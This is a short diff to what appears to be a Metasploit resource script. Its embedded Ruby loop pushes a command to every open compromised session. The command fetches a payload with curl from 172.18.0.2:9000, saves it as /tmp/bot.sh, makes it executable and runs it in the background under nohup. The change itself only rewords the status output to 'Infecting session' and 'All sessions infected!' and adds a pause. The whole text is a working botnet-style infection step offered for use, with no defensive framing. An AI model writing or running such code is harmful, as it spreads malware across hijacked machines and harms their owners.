@@ -15,10 +15,13 @@ sleep 3
 
 # Deploy payload to each session using Ruby
 <ruby>
+print_status("Deploying payloads to #{framework.sessions.length} sessions...")
 framework.sessions.each do |sid, session|
-  print_status("Deploying payload to session #{sid}")
-  session.shell_write("curl -s http://172.18.0.2:9000/payload -o /tmp/bot.sh && chmod +x /tmp/bot.sh && nohup /tmp/bot.sh >/tmp/bot.log 2>&1 &\n")
-  print_good("Command sent to session #{sid}")
+  print_status("Infecting session #{sid}...")
+  cmd = "curl -s http://172.18.0.2:9000/payload -o /tmp/bot.sh && chmod +x /tmp/bot.sh && nohup /tmp/bot.sh >/tmp/bot.log 2>&1 &\n"
+  session.shell_write(cmd)
+  sleep(1)
+  print_good("Session #{sid} infected")
 end
-print_good("Payload deployment complete!")
+print_good("All sessions infected!")
 </ruby>
